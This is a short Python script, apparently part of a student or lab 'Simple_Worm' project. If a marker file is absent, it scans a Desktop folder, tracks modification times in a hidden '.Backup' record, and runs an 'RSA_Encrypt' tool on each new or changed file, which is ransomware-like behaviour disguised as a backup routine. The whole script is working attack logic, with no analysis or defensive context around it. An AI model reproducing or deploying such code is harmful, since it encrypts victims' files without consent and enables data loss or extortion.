from os import listdir
from os.path import isfile, isdir, join
import time
import os
import string
import distutils.spawn

def is_tool(name):
  return distutils.spawn.find_executable(name) is not None

if not is_tool('/home/attacker/Public/.Simple_Worm/RSA.py'):

	rc = []
	if os.path.isfile('/home/attacker/Desktop/.Backup/rc.txt'):
		rc = open('/home/attacker/Desktop/.Backup/rc.txt', 'r').read().splitlines()

	file_list = []
	file_time = []
	for record in rc:
		file_list.append(record.split('=====', 1)[0])
		file_time.append(record.split('=====', 1)[1])

	new = []	
	path = '/home/attacker/Desktop' 
	files = listdir(path)
	for f in files:
		fullpath = join(path, f)
		if isfile(fullpath):
			mod_time = time.ctime(os.path.getmtime(fullpath))
			if fullpath in file_list:
				if mod_time != file_time[file_list.index(fullpath)]:
					os.system('/home/attacker/Desktop/.Backup/RSA_Encrypt -C 126419 30743 ' + fullpath.replace(' ', '\ '))
					new.append(fullpath + '=====' + time.ctime(os.path.getmtime(fullpath)))			
				else:
					new.append(fullpath + '=====' + mod_time)	
			else:
				os.system('/home/attacker/Desktop/.Backup/RSA_Encrypt -C 126419 30743 ' + fullpath.replace(' ', '\ '))
				new.append(fullpath + '=====' + time.ctime(os.path.getmtime(fullpath)))
	with open('/home/attacker/Desktop/.Backup/rc.txt', 'w') as f:
		for item in new:
			f.write("%s\n" % item)

		
